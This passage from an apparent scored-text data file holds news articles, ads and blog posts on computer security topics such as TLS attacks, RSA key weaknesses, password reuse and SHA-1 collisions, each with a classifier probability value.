always thinking of new schemes that provide unauthorized access to valuable information. The Nigerian prince that only needs your checking account number to make you rich may not be sending you emails anymore, but you may receive an email from a logistics company referencing a package that is waiting for you. Once you open the email, a Trojan horse is placed on your machine that monitors the online transactions performed via the infected computer as well as the passwords and usernames for different services and credit card accounts. This attack can lead to empty bank accounts as well as a huge headache. Protection against cyber attacks can include anti-virus software, anti-spyware software and a properly configured firewall. Policies and procedures that deal with access to sensitive data as well as access to certain hardware can make everyone at an organization part of the safeguarding process. As the cyber attacks increase in frequency and sophistication, the efforts to stop the attacks will have to evolve and adapt to meet the challenge. Having a cyber risk-aware culture at your company could be the difference between being a rich prince or being a ruined pauper. Ronnie L. Williams is the director of finance for HealthChoice LLC.",
        "prob": "tensor([[2.0946e-06, 1.0000e+00]])"
    },
    {
        "text": "Today, the most common way of getting hit by malware is by browsing the Internet. It hasn't always been this way. Years ago, floppy disks were the main malware vector. Then sharing of executable files. Then e-mail attachments. But for the past five years, the Internet has been the main source of malware, according to a new report by F-Secure, an anti-virus, cloud content and computer security company based in Helsinki, Finland. There is no exploit without a vulnerability. Ultimately, vulnerabilities are just bugs, that is, programming errors. We have bugs because programmes are written by human beings, and human beings make mistakes. Software bugs have been a problem for as longs as we have had programmable computers - and they are not going to disappear, it says. Let's take a look at top domains hosting malware, a software used or created by attackers to disrupt computer operation, gather sensitive information, or gain access to private computer systems.",
        "prob": "tensor([[2.0568e-06, 1.0000e+00]])"
    },
    {
        "text": "The view from the top of IT with TechWorld Editor Rohan Pearce SSL, or Secure Sockets Layer, is the \"great enabler\" of online commerce. It's the S in HTTPS, and it's the padlock in the address bar of your browser. It's the underlying protocol which stops the cybercrooks enjoying a complete free-for-all when you spend money or read your email online. Together, SSL and its big brother Transport Layer Security (TLS, which is SSL with a beard and in grown-up clothes) provide a ubiquitous cryptographic mechanism by which two people on the internet, including people who have never met or done business with each other before, can exchange information with secrecy, authenticity and integrity. Loosely speaking, that means they can verify that they really are talking to each other, not to an impostor; that no-one else is eavesdropping; and that no-one can tamper with the content of their conversation. In sequence, these SSL-related disaster stories involve: the prevalent server-side implementation of SSL/TLS in a cryptographically weak way; a corporate break-in allowing an Iranian hacker to mint himself fake online SSL IDs; an admission by a certificate authority that it had been hacked in 2010 but forgot to tell anyone; stolen SSL certificates used by a virus writer; and a certificate authority that got caught out creating an eavesdropping SSL certificate for a customer. It gets worse. Not one but two research papers have just surfaced, digging into the mechanics of actually building the bits-and-bytes of SSL certificates. The results aren't catastrophic, but they are, to say the least, interesting. Most SSL certificates rely on a public key encryption algorithm called RSA for their authentication component. The idea is that I create a pair of keys: one public; the other private. So if I sign something with my private key, you can use my public key to verify that only I could have signed it. And if you encrypt something with my public key, you can be sure than only I can unlock it. Provided, of course, that my private key really is private. Assuming no-one steals my key, or pays a certificate authority to issue a fake key in my name, just how unique [*] is is my private key? Is there a chance that someone else, without any malice aforethought, might unexpectedly end up with a key pair that is identical or at least dangerously similar to mine? \"Yes,\" according to this latest research. The problem comes in key generation. Greatly oversimplified, RSA requires you to generate a unique pair of prime numbers, p and q, and to publish, amongst other things, their product, n. You can't be mathematically certain that your p and q are unique, but if they are generated genuinely randomly, the chance that someone else chose them already ought to be vanishingly small. If you could split n back into p and q, you would have cracked the key. So the security of the system depends on the difficulty of taking that public value nand converting it back into its prime factors p and q. Prime numbers are only divisible by themselves. So the product of two prime numbers is divisible only by itself and those two primes. Factoring small primes is easy. 15, for example is 5 x 3. You can do this in your head. But factoring ever-larger prime products is ever harder. Try doing the 10-digit product 9326222179 [**] in your head, and then bear in mind that the smallest prime products recommended for current use in RSA keys are over 300 digits long (1024 bits). So, if someone else has a key with the same n as yours, you know their pand q, because each n factors in only one way. Alternatively, if they choose one of p or q non-randomly, you have a better-than-average chance of guessing it. Since q = n/p and p = n/q, guessing one prime factor gives you the other one on a plate. And the recent research found a small but worrying number of public keys which shared the same value of n, or which used prime factors from an obviously non-random source. I'm not going to repeat the papers' findings here - the authors deserve that you read the actual results by clicking through to their own articles, here and here - but both sets of researchers found duplicated ns (prime products), and ns which could be factored easily. At least some of these problems are explained by poor (or just plain wrong) random number generation, leading to one or both of p and q being guessable, thus breaking the privacy of the resulting private key. As the famous mathematician and computer scientist John von Neumann is supposed to have said : Any one who considers arithmetical methods of producing random digits is, of course, in a state of sin. For, as has been pointed out several times, there is no such thing as a random number. There are only methods to produce random numbers, and a strict arithmetic procedure ... is not such a method. If you're a coder, don't cut corners on randomness. And never, ever try to roll your own pseudo-random number generator, unless you're a world-class cryptographer.",
        "prob": "tensor([[2.1392e-06, 1.0000e+00]])"
    },
    {
        "text": "Software developers are racing to patch a recently discovered vulnerability that allows attackers to recover the plaintext of authentication cookies and other encrypted data as they travel over the Internet and other unsecured networks. The discovery is significant because in many cases it makes it possible for attackers to completely subvert the protection provided by the secure sockets layer and transport layer protocols. Together, SSL, TLS, and a close TLS relative known as Datagram Transport Layer Security are the sole cryptographic means for websites to prove their authenticity and to encrypt data as it travels between end users and Web servers. The so-called \"Lucky Thirteen\" attacks devised by computer scientists to exploit the weaknesses work against virtually all open-source TLS implementations, and possibly implementations supported by Apple and Cisco Systems as well. (Microsoft told the researchers it has determined its software isn't susceptible.) The attacks are extremely complex, so for the time being, average end users are probably more susceptible to attacks that use phishing e-mails or rely on fraudulently issued digital certificates to defeat the Web encryption protection. Nonetheless, the success of the cryptographers' exploits—including the full plaintext recovery of data protected by the widely used OpenSSL implementation—has clearly gotten the attention of the developers who maintain those programs. Already, the Opera browser and PolarSSL have been patched to plug the hole, and developers for OpenSSL, NSS, and CyaSSL are expected to issue updates soon. \"The attacks can only be carried out by a determined attacker who is located close to the machine being attacked and who can generate sufficient sessions for the attacks,\" Nadhem J. AlFardan and Kenneth G. Paterson researchers wrote in a Web post that accompanied their research. \"In this sense, the attacks do not pose a significant danger to ordinary users of TLS in their current form. However, it is a truism that attacks only get better with time, and we cannot anticipate what improvements to our attacks, or entirely new attacks, may yet be discovered.\" A PDF of their paper is here. How it works Lucky Thirteen uses a technique known as a padding oracle that works against the main cryptographic engine in TLS that performs encryption and ensures the integrity of data. It processes data into 16-byte chunks using a routine known as MEE, which runs data through a MAC (Message Authentication Code) algorithm, then encodes and encrypts it. The routine adds \"padding\" data to the ciphertext so the resulting data can be neatly aligned in 8- or 16-byte boundaries. The padding is later removed when TLS decrypts the ciphertext. The attacks start by capturing the ciphertext as it travels over the Internet. Using a long-discovered weakness in TLS's CBC, or cipher block chaining, mode, attackers replace the last several blocks with chosen blocks and observe the amount of time it takes for the server to respond. TLS messages that contain the correct padding will take less time to process. A mechanism in TLS causes the transaction to fail each time the application encounters a TLS message that contains tampered data, requiring attackers to repeatedly send malformed messages in a new session following each previous failure. By sending large numbers of TLS messages and statistically sampling the server response time for each one, the scientists were able to eventually correctly guess the contents of the ciphertext. It took the scientists as little 223 sessions to extract the entire contents of a TLS-encrypted authentication cookie. They were able to improve their results when they knew details of a the ciphertext they were trying to decrypt. Cookies formatted in base 64 encoding, for example, could be extracted in 219 TLS sessions. The researchers required 213 sessions when a byte of plaintext in one of the last two positions in a block was already known. The Lucky Thirteen attacks are only the latest exploits to subvert TLS, which along with SSL is intended to safeguard bank transactions, login sessions, and other sensitive activities carried out over unsecured networks. One of the most serious recent attacks used a universal wildcard certificate to spoof the credentials of virtually any website on the Internet. The previously mentioned BEAST attack was able to decrypt an eBay authentication cookie, although the technique required the attackers to first subvert something known as the same origin policy. Late last year, the same researchers behind BEAST devised CRIME, an attack that used Web compression to subvert TLS/SSL. TLS remains vulnerable to such attacks largely because of design decisions engineers made in the mid-1990s when SSL was first devised, Johns Hopkins University professor Matthew Green observed in a blog post published Monday that explains how Lucky Thirteen works. Since then, engineers have applied a series of \"band-aids\" to the protocols rather than fixing the problems outright. The attacks apply to all implementations that conform to version 1.1 or 1.2 or version 1.0 or 1.1 of TLS or DTLS respectively. They also apply to implementations that conform to version 3.0 of SSL or version 1.0 of TLS when they have been tweaked to incorporate countermeasures designed to defeat a previous padding oracle attack discovered several years ago. It's not the first time SSL and TLS have been brought down using a padding Oracle attack. The protocols were later patched to prevent attacks that used subtle differences in timing to ferret out details about the encrypted plaintext. At the time, some cryptographers acknowledged a tiny window that could still permit that type of exploit. The scientists dubbed their exploit \"Lucky Thirteen\" because it's made possible by the TLS MAC calculation including 13 bytes of header information. \"So, in the context of our attacks, 13 is lucky—from the attacker's perspective at least,\" the researchers wrote in their Web post. \"This is what passes for humor amongst cryptographers.\" Story updated to add detail about Microsoft in the second paragraph.",
        "prob": "tensor([[2.0503e-06, 1.0000e+00]])"
    },
    {
        "text": "A team of Canadian researchers have uncovered an unusual new example of “upstream filtering,” where online content in one country is blocked in another country due to filtering that happens in transit. Researchers at the Citizen Lab at the Munk School of Global Affairs at the University of Toronto, revealed that some Oman Internet users using the Omantel ISP are also being subjected to Indian content restrictions because of traffic flowing through India. “It goes to show what you can find when you begin to probe beneath the surface of the Internet, and what you see when you have governments start to mess with the openness of the Internet,” Ron Deibert, Citizen Lab's director, told Ars on Thursday. “In this case you have a perverse situation where citizens in one country are subject to filtering in another country.” While there have been numerous examples of specific countries blocking foreign or domestic content that they find objectionable, as it runs afoul of their own laws or regulations, it’s rare for one country to accidentally block sites due to peering agreements and traffic flows. In this case, Indian ISP Bharti Airtel and Omantel have peering agreements, and partnered with other companies to build the Europe India Gateway, a 15,000-kilometer fibre optic cable that connects 13 countries via the Suez Canal in Egypt. Citizen Lab conducted numerous tests in late June 2012 both remotely via a proxy, and also in collaboration with Omani Internet users, but also found that the blocks may not be consistently applied at all times. Entertainment, news sites affected “The practice of upstream filtering raises a number of questions, including jurisdictional issues and the lack of recourse to users in Oman,” Citizen Lab states in its report. “The application of filters in India restricts Internet users in Oman from accessing content, potentially even content produced in Oman itself, as a result of actions taken for domestic purposes within India. Users in Oman did not consent to this blocking, are left with little recourse for challenging these actions, and have limited means of accessing this content, which may or may not be in violation of Omani regulations. Combined with the significant filtering implemented by Omantel itself, this essentially puts Internet users in Oman behind multiple layers of national-level filtering.” Primarily, the sites affected included Indian and Pakistani entertainment sites, political blogs, file-sharing websites, and even IndyBay, a San Francisco-based online news site. Not surprisingly, many Internet watchers lament this odd state of affairs online. “Decisions made in one country about acceptable online content often affect users in other countries,” wrote Jillian York, the director for international freedom of expression at the Electronic Frontier Foundation, in an e-mail sent to Ars on Thursday. “This can occur through upstream filtering such as in this scenario or through application of a bill like SOPA, where the US government would have been enabled to make decisions about foreign content.\" Similar examples in Central Asia Oman has its own national filtering system, written in Arabic and English, which announces that it blocks content that is “contrary to the laws of the Sultanate.” Omantel users seeing the Indian block are shown an English-only message, which states: “This website/URL has been blocked until further notice either pursuant to Court orders or on the Directions issued by the Department of Telecommunications.” The Department of Telecommunications is the name of India’s telco regulations agency. But beyond the name coincidence, running a traceroute from Oman or an Oman proxy, shows that the traffic to a US-based site runs through India. India tends to filter security and Internet tools-related content, according to previous research done by the Open Network Initiative (ONI), while Oman’s tend to be more along the lines of blocking pornographic material, gay and lesbian content, and circumvention tool-related sites. The ONI is a grouping of similar institutions that also includes the SecDev group and the Berkman Center for Internet and Society at Harvard University. In its extensive research on Internet filtering around the world, ONI has found similar examples in the past. Most notably there was a case in Kyrgyzstan, which had some sites blocked by a state ISP from Kazakhstan while selling its service to Kyrgyz Telecom. “Similar behavior was observed in Uzbekistan in 2004, where content filtering on one Uzbek ISP closely matched that seen in China, a finding supplemented by evidence that this ISP was purchasing connectivity service from China Telecom,” the Citizen Lab added in the report. Of course, any Omantel user or any other Internet user with a VPN or other circumvention tool would easily get around such blocks—a service that a New Zealand ISP advertised earlier this year with the express purpose of getting around Hulu and Netflix's geoblocking.",
        "prob": "tensor([[0.0128, 0.9872]])"
    },
    {
        "text": "Receive Your Complimentary White Paper NOW! \"Beginner's Guide to SSL Certificates: Making the Best Choice When Considering Your Online Security Options\" SSL stands for “Secure Socket Layer.” It is a technology that establishes a secure session link between the visitor's web browser and your website so that all communications transmitted through this link are encrypted and are, therefore, secure. SSL is also used for transmitting secure email, secure files, and other forms of information. Whether you are an individual or a company, you should approach online security in the same way that you would approach physical security for your home or business. Not only does it make you feel safer but it also protects people who visit your home, place of business, or website. It is important to understand the potential risks and then make sure you are fully protected against them. In the fast-paced world of technology, it is not always easy to stay abreast of the latest advancements. For this reason it is wise to partner with a reputable Internet security company. Sponsored by: Symantec Website Security Solutions Offered Free by: Symantec Corporation Other Resources from:",
        "prob": "tensor([[2.0111e-06, 1.0000e+00]])"
    },
    {
        "text": "Google, Amazon, Facebook Help U.K. Researchers Hack Cancer The aim of the resulting game -- codenamed GeneRun -- is to recruit as many \"citizen scientists\" as possible to play what are hoped to be fun and engaging games, but which are actually cleverly disguised ways to get more eyeballs on very complex cancer mutation graphical data. - The Untapped Potential of Mobile Apps for Commercial Customers - Mobility Management Ailments: A Healthcare IT Cure Lessons from HiMSS13 - Redefining Value in Healthcare: Innovation to expand access, improve quality and reduce costs of care - Enabling Healthcare Transformation with Social Business At present, researchers need to carefully spot connections in cancer DNA mutation data by eye, as this is a task that can not yet be automated with computers. The problem: there are not enough scientists to do that, which means insights into the way cells become cancerous are being lost. \"Our machines can't pick up on the very slight variations and nuances that only the human eye can pick up on,\" said Amy Carton, Citizen Science projects lead at Cancer Research U.K., the research charity behind the program. \"And we have terabytes of data to get through.\" [ Want to learn how big data is contributing to the fight against cancer? See IBM Watson Helps Doctors Fight Cancer. ] If it comes off, GeneRun could add the help of thousands of volunteer \"researchers,\" who will (presumably) be sifting through data while they are solving puzzles or killing virtual aliens. The GameJam hackathon will bring together 40 developers, graphic designers, data specialists and gamers to come up with a basic design by Sunday, March 3. An agency will then build the game, with a proposed summer 2013 launch. \"We're making great progress in understanding the genetic reasons cancer develops,\" said professor Carlos Caldas, senior group leader at the Cancer Research U.K. Cambridge Institute at the University of Cambridge. \"But the clues to why some drugs will work and some won't are held in data which need to be analyzed by the human eye -- and this could take years. By harnessing the collective power of citizen scientists we'll accelerate the discovery of new ways to diagnose and treat cancer much more precisely.\" The British arm of Amazon Web Services is providing -- for no charge -- the technology platform on which the final game will be hosted, plus supplying the 40 anticipated GameJam participants with free technology resources and expertise to help them start GeneRun game development. Facebook U.K. is similarly supporting the cancer GameJam with expertise from its London-based engineering team, and it has been acting as an informal recruiter through its links with some of the British universities sending attendees, including London's City University. Google U.K. will provide financial support and is hosting the hackathon at Campus, its co-working space in the heart of East London's Tech City. \"It is exciting to be part of this project and use cloud technology and gamification of data to help in driving research towards finding a cure for cancer,\" said Teresa Carlson, VP of worldwide public sector for Amazon Web Services. Philip Su, engineering site director of Facebook London, said, \"At Facebook we believe the best way to solve a problem is to bring smart people together to 'hack' a solution; that approach is just as valid in the field of life sciences as it is in software engineering.\" Speaking on the BBC Friday morning, Su said, \"We're harnessing the power of people from all over the place here ... The average U.K. Facebook user has 256 friends and if only one of those people potentially downloads this game, then that could really help. We see this as an unqualified 'good.'\" For George Freeman, a politician who is also life science adviser to the government, \"This is a fantastic example of how the U.K. is harnessing the power of the Internet for good, using cutting-edge technology to further research. We look forward to seeing the fruits of this innovative exercise.\" GeneRun will combine anonymized Cancer Research U.K. DNA datasets with data analysis technology from The Citizen Science Alliance, a group of organizations committed to increasing the British public's participation in science. The GeneRun experiment follows that organization's earlier attempt to recruit crowdsourcing help in unpicking complex dataset analysis using a game called CellSlider, which gets gamers to help analyze archived cancer tissue samples. Carton told listeners on the BBC Friday that CellSlider was able to process in three months via a global crowdsourcing game effort what otherwise would have taken 18 months. \"We've already seen that there are tens of thousands of people happy to contribute their spare time to the cause of science,\" said Dr. Chris Lintott, the Alliance's chair. \"We hope the GameJam will let even more people join forces to help find cures for cancer.\" \"We're looking for use of people's 'micro-moments' here,\" added Carton. \"We're asking people to kill a bit of time here and also do what we all want to do at the same time. Kill cancer.\"",
        "prob": "tensor([[0.0180, 0.9820]])"
    },
    {
        "text": "What is Cloud Computing? Cloud computing is a general term for anything that involves delivering hosted services over the Internet. These services are broadly divided into three categories: Infrastructure-as-a-Service (IaaS), Platform-as-a-Service (PaaS) and Software-as-a-Service (SaaS). The name cloud computing was inspired by the cloud symbol that's often used to represent the Internet in flow charts and diagrams. A cloud service has three distinct characteristics that differentiate it from traditional hosting. It is sold on demand - it is elastic -- a user can have as much or as little of a service as they want at any given time; and the service is fully managed by the provider (the consumer needs nothing but a personal computer and Internet access). Significant innovations in virtualization and distributed computing, as well as improved access to high-speed Internet and a weak economy, have accelerated interest in cloud computing. Cloud Computing revolutionizes the way businesses work by allowing instant, secure access to your private hosted network from anywhere. All of your software programs, data files, emails and other company data is accessible to you from any pc world wide. Cloud Computing offers clients a fully secured, managed, and maintained IT Infrastructure which allows you and your colleagues to work in a high-speed network environment without ever having to take on the cost of purchasing or maintaining servers, expensive networking equipment and backup systems. Cloud Computing: Advantages for enterprises The most important benefit of the Cloud Computing include—resource and budget optimization with rapid scaling up or down— higher security and improved reliability over a traditional client-server system. Fixed Monthly Costs Allow For Financial Planning : RTCS Cloud Computing is a fully hosted and managed solution that includes secure remote access, data storage, application hosting, backups, antivirus, intrusion detection, hosted desktop, Windows updates, and unlimited support. For a low, fixed per user monthly fee your users will receive a hosted IT Infrastructure that costs thousands of dollars to purchase and maintain, making unpredictable IT costs a thing of the past. Since 2004 RTCS has revolutionized the way businesses work using Hosted IT Infrastructure! Where do the applications and data reside? Never Load Programs or Applications on Your Workstation again because your applications and data reside on a secure remote server that is fully managed and supported by a third-party. RTCS Cloud Computing eliminates the need to load applications directly onto your local workstation. Whether it is your company’s customer management system, billing and accounting system, or simply your company time clock, everything is stored on your virtual office environment. Your Hosted IT Infrastructure will provide you with an all-in-one fully managed server desktop available to you anywhere at any time. 24x7 Data Security & Monitoring : Data security is a vital element for growing businesses in today’s world. More than ever before \"Cyber Intruders\" are on the prowl for vulnerable computer networks. Malicious attempts to compromise the confidentiality, integrity and availability of business resources are on the rise. Our security team monitors your Hosted IT Infrastructure and network environment 24 hours a day to ensure your system is always safe from hackers, viruses, malware and spyware. We understand the importance of security and that is why we include corporate, enterprise level security and monitoring free with your organization’s RTCS hosting. Our security systems include defense mechanisms such as a network antivirus, state of the art Cisco firewalls, and intrusion detection systems. We ensure that only you have access to your programs and files 24 hours a day, 7 days a week. Read More.... Daily Data Backup : Protecting your data from a disaster is critical for companies who rely on electronic data as their medium of communications and operations. In a traditional network, an office manager, or in many cases the owner, assumes the responsibility of backup. Because the designated person is often too busy to manage and monitor the data backups, they are often left undone. In the event of a system failure, data is lost and your business will suffer. RTCS services include fully managed and automated, offsite backup protection for all of your mission critical data. We have dedicated team members who specialize in data backup and disaster recovery procedures to ensure your business continuity in the event of a disaster. Our daily offsite backups along with our weekly server snapshots will ensure that you are protected and never have to worry about losing valuable data. Data Center Facilities : RTCS protects your business with nothing but the best. That is why we deploy our Cloud Computing solutions with SoftLayer, a Tier IV SAS 70 compliant co-location facility that provides a world renowned, reliable data and Hosted IT Infrastructure. With features such as biometric access controls, N+1 cooling systems, fire suppression systems, uninterruptible power solutions, and multi-homed Internet connectivity, your virtual Hosted IT Infrastructure meets your demands and exceeds your expectations. Unlimited Dedicated Support : RTCS has a professional, friendly support team available to you 24 hours a day, 7 days a week, 365 days a year. We know that your business can’t be put on pause, so we make sure that we are always there to provide you with the highest level of quality support right when you need it. We do our job so you can focus on yours. Hide this content. Fill the Online Order Form or call 888-408-6044",
        "prob": "tensor([[2.0074e-06, 1.0000e+00]])"
    },
    {
        "text": "We often mock \"security through obscurity\", but it is not without value, especially in today's web environment. Most attacks today are statistical in nature: a virus attempts to infect 10,000 computers by blasting out random attacks. If it infects even two more computers out of those 10,000, it has achieved its goal. Those viruses are aggressive in volume, not precision. They don't all do a port scan, analyze the responses to determine OS version, they don't do a vulnerability assessment, then launch a precise attack the way a human would. Instead, they try to exploit a common weakness - a buffer overrun exploit in PHP, or SQL injection vulnerability in a Wordpress plugin. Anything the system administrator does to alter their defaults: changing the base URL from \"index.html\" to \"index.htm\", or changing the database names in MySQL, might keep a particular automated attack from harming his system. It doesn't remove the vulnerability, it merely changes it so that an attack relying on the defaults will not succeed. Will this keep out a determined attacker? Of course not. But it will reduce the number of low-level threats that can still surprise anyone if they exploit a 0day vulnerability. And those low-level threats can quickly escalate to be every bit as damaging as an Advanced Persistent Threat. That's why obscurity, which I define here as to be \"any implementation settings changed from the default\", still improves your overall security picture. It may only reduce a few particular attacks, or delay them by a few days, but those days can be enough to get a real patch installed. In practice, preventing a threat from becoming a successful attack is the true job of security, regardless of whether it was based on bad theory.",
        "prob": "tensor([[2.0286e-06, 1.0000e+00]])"
    },
    {
        "text": "Posted by: MelanieYarbrough Member Batye recently reviewed Stealing the Network: The Complete Series Collector’s Edition for our Bookworm Blog. It’s a collection of fictional stories that takes a look at the possibilities available to hackers with some time and bad intentions. While the collection is meant to be an aid to ethical hackers and security professionals looking to be proactive, it brings up a moral dilemma. How can you ever ensure that the knowledge you’re passing on will be used for good rather than evil? A question was recently posted in the IT Forums regarding embedding executable files into a JPEG, a common tactic for spreading malware to unsuspecting end users. The community responded with mixed feelings toward the intentions of the asker. Who draws the line between helping out your fellow IT professionals and providing ill intent with the recipe for possible harm? The simple answer is that no one draws that line except for you. IT Knowledge Exchange doesn’t expect you to provide any information you feel uncomfortable disclosing, and that goes for answering deceivingly innocuous questions. Member Chippy088 shares his own philosophy on the dilemma: [It's] not a good idea to help everyone without thinking about their reason for the question first. Have there been circumstances in your tech career that have made you uncertain about passing on your own knowledge? What are some nuggets of advice you’d want to pass on to those who are new to IT Knowledge Exchange or IT in general?",
        "prob": "tensor([[2.0505e-06, 1.0000e+00]])"
    },
    {
        "text": "For years computer security experts have been preaching that users should never share the same password across their connected lives -- at online banking sites, at Amazon, on their Web mail services, even on their cell phones. Apparently, most people ignore that advice. A new study by security firm Trusteer found that 73 percent of Web users take their online banking password and use it at other Web sites. And about half of all consumers utilize the same password and user name at online banking sites and other sites. \"I must say I was very surprised,\" said Amit Klein, chief technology officer of Trusteer. \"It is surprisingly sad that such a large portion of users use their banking credentials at other sites. ... It exposes those users to attacks that would otherwise be impossible. I thought that people would take banking credentials more seriously, but it turns out that in this digital age, this is not the reality.\" When consumers use the same password across multiple sites, hacking becomes trivially easy. If a criminal breaks into a smaller Web site -- say a site created by a local grocery store -- and grabs a cache of passwords, their next step is always the major banking Web sites. When you consider that 40 percent of U.S. consumers' checking accounts are tied up in the four largest banks, odds are good that the stolen credentials will work for in one of them. Password overlap also creates an easy end run around sophisticated banking security technology, which is only as strong as the weakest site where the password is used. Banks might enforce strong password creation requirements, for example. But if a consumer uses a bank password at a poorly defended small site, a hacker can break into the small site, steal the log-in information and essentially crack the bank's high-tech system. \"This is something that should be of huge concern both to banks and to users,\" said Klein. Trusteer unearthed the data through use of its Rapport security software, which is designed to warn users when they are about to enter a critical banking password into a site where it doesn't belong -- a phishing site, for example. The tool was used to examine the behavior of 4 million computer users during a 12-month period. During that span, the firm found that 73 percent used their online banking password on at least one non-financial Web site. And it didn't help much when the banks enforced strict password controls. When a bank allowed consumers to pick a user ID, 65 percent used it on other sites. When a bank assigned a customer ID, 42 percent used it at other sites and 42 percent used both the ID and the password on at least one other site. 'They don't think it's worth the trade off' Last year, analyst firm Gartner released a survey that reported similar results. It said two-thirds of consumers use the same one or two passwords across all Web sites they access. But Avivah Litan, who directed the Gartner survey, said that choice might not be as unreasonable -- or as unsafe -- as it seems. \"They are making a choice for convenience over security,\" she said. \"They are using a cost-benefit equation ... and they don't want to try to remember 10 different passwords for everything they do. They don't think the trade-off is worth it, honestly.\" While password sharing isn't a safe practice, Litan said, complicating your life with multiple passwords isn't exactly a cure-all. \"The truth is criminals steal your passwords lots of ways, such as recording keystrokes, and if they do that, it doesn't matter whether your password is 15 characters and unique or 7 characters and the same for every site. People have figured this out,\" she said. Using multiple passwords is a good idea, but Litan said it is important that consumers understand the risks that remain even if strong passwords are used. \"It is another lock on the door but a lock that is easily picked,\" she said. \"Still, it's always better to put as many blocks in the road you can.\" Large banks don't rely on simple user/password combinations to identify users anymore, she added. Numerous technologies are used to prevent fraud through a strategy called \"layered security.\" Device fingerprinting of PCs is a key tool, she said. Web sites tag computer hardware by monitoring unique characteristics, such as exact processor speed or time and date settings. Sites that use device fingerprinting see fraud rates drop 15 to 20 percent, she said. Banks also look for suspicious behavior, such as attempted transfers to unusual accounts. Another hacker giveaway: clicks through Web sites that occur at high speed, showing an automated PC -- and not a person -- is attempting a transaction. Humans take, on average, about 10 seconds before they click \"confirm payment.\" Computers controlled by hackers racing through stolen login accounts barely wait at all. \"That's best-of-breed security,\" Litan said. \"If you as a bank are relying on passwords for security then you have a poor security system.\" RED TAPE WRESTLING TIPS It should be comforting to know that your user ID and password are not all that stands between a hacker and your money. Still, that's no reason to let your guard down. Your banking passwords should be handled with great care, and shouldn't be shared with other Web sites. And remember, many Web firms that store your critical personal information do not use best-of-breed security on their back end -- meaning you are still at risk. A criminal who stole your Facebook credentials could easily wreak havoc with your life, so protect those accounts, too. Klein concedes that the vast majority of computer users will never create unique user/password combinations for all their sites. As a more practical goal, he recommends maintaining three \"families\" of passwords -- one for critical financial sites, a second for sites that store your personal information, and a third for generic log-ins. \"And you don't want to mix those passwords,\" he said.",
        "prob": "tensor([[2.1349e-06, 1.0000e+00]])"
    },
    {
        "text": "A Pakistani Internet user surfs the YouTube Web site at a local Internet cafe in Islamabad, Pakistan, Feb. 26, 2008. Pakistan defended its clampdown on the YouTube Web site which accidentally interrupted access for Internet users around the globe. \"Duties for Internet Service Providers\" Belfer Center Programs or Projects: Explorations in Cyber International Relations; Information and Communications Technology and Public Policy; Science, Technology, and Public Policy \"Duties for Internet Service Providers\" was commissioned as part of a special paper series for the second annual Cyber Dialogue forum which took place March 18–19, 2012, in Toronto, Canada. Building upon the 2011 successful dialogue — Securing the Cyber Commons? — the 2012 Cyber Dialogue addresses the question: What is Stewardship in Cyberspace? In today's interconnected world, the Internet is no longer a tool. Rather, it is a service that helps generate income and employment, provides access to business and information, enables e-learning, and facilitates government activities. It is an essential service that has been integrated into every part of our society. Our experience begins when an Internet Service Provider (ISP) uses fixed telephony (plain old telephone service), mobile-cellular telephony, or fixed fiber-optic or broadband service to connect us to the global network.1 From that moment on, the ISP shoulders the responsibility for the instantaneous, reliable, and secure movement of our data over the Internet. ISPs come in many forms and sizes and go by many names: the phone company, the cable company, the wireless company, etc. They are the Internet stewards: planning and managing resources, providing reliable connectivity, and ensuring delivery for traffic and services. And while the communications infrastructure security as a whole is generally believed to be robust, recent events suggest that the networks and the platforms on which Internet users rely are becoming increasingly susceptible to operator error and malicious cyber attack. In 2012, we should therefore ask whether ISPs have additional duties to ensure the reliable delivery of an essential service. In this article, we expose the gap between ISPs' written responsibilities and the unwritten, yet expected ones. Specifically, we define eight ISP duties: - Duty to provide a reliable and accessible conduit for traffic and services - Duty to provide authentic and authoritative routing information - Duty to provide authentic and authoritative naming information - Duty to report anonymized security incident statistics to the public - Duty to educate customers about threats - Duty to inform customers of apparent infections in their infrastructure - Duty to warn other ISPs of imminent danger and help in emergencies - Duty to avoid aiding and abetting criminal activity The latter duties are helpful in calibrating threats and funding responses to them.... The full text may be downloaded below. 1 Services include: Public-switch telephone network (dial-up); Digital Subscriber Line (DSL) (usually copper), Asymmetric Digital Subscriber Line (ADSL); broadband wireless; cable modem (cable Internet); Fiber to the Premises (FTTx) (optical fiber); Integrated Services Digital Network (ISDN) (transmission of voice, video, data, and other network services over the traditional circuits); frame relay (wide-area network); Ethernet; Asynchronous Transfer Mode (ATM); satellite Internet access; and synchronous optical networking (SONET) (using lasers over fiber). - Full text of \"Duties for Internet Service Providers\" (1.8 MB PDF) For more information about this publication please contact the STPP Web Manager at 617-496-1981. For Academic Citation:",
        "prob": "tensor([[0.0072, 0.9928]])"
    },
    {
        "text": "So what is SHA-1? From wikipedia: The SHA (Secure Hash Algorithm) family is a set of related cryptographic hash functions. The most commonly used function in the family, SHA-1, is employed in a large variety of popular security applications and protocols, including TLS, SSL, PGP, SSH, S/MIME, and IPSec. SHA-1 is considered to be the successor to MD5, an earlier, widely-used hash function. The SHA algorithms were designed by the National Security Agency (NSA) and published as a US government standard. The first member of the family, published in 1993, is officially called SHA; however, it is often called SHA-0 to avoid confusion with its successors. Two years later, SHA-1, the first successor to SHA, was published. Four more variants have since been issued with increased output ranges and a slightly different design: SHA-224, SHA-256, SHA-384, and SHA-512 — sometimes collectively referred to as SHA-2. From w3c.org: The Secure Hash Algorithm takes a message of less than 264 bits in length and produces a 160-bit message digest which is designed so that it should be computationaly expensive to find a text which matches a given hash. ie if you have a hash for document A, H(A), it is difficult to find a document B which has the same hash, and even more difficult to arrange that document B says what you want it to say. Some months ago a team of chinese researchers found an algorithm that could produce collisions in SHA-1, i.e., different messages could produce the same hash, which could be used, in theory, to forge certificates. SHA-1 is supposed to require at least 2^80 to produce a collision, which would be enough to keep it squarely out of supercomputer realm. The researchers initially managed to produce collisions in 2^69 operations, and now they were able to do it in 2^63. The lower it gets, the faster it is to break :D For now, this is only a paper... until someone implements it, and then the fun begins. Although the US are recommending a move to SHA-2, there's this interesting quote by the NIST security technology group manager William Burr, in Federal Computer Week: \"SHA-1 is not broken, and there is not much reason to suspect that it will be soon.\" Should become an interesting tagline in a bit of time... hehehe Friday, August 19, 2005 So what is SHA-1? Posted by Andreia Gaita at 18:11 Tuesday, August 16, 2005 Nothing at all related to coding, this one, but leaving it here as a reminder for myself later - from September 23 to October 18, at Faleria António Prates, there will be a show of paintings done by robots created by a painter, Leonel Moura. Tak about conceptual art :p Posted by Andreia Gaita at 15:34 Not directly related to coding, but a very interesting topic on it's own, is Computer Forensics and Incident Response. To relate this to coding, this field is so new that there's a huge need for good solid reliable smart tools to analyze and 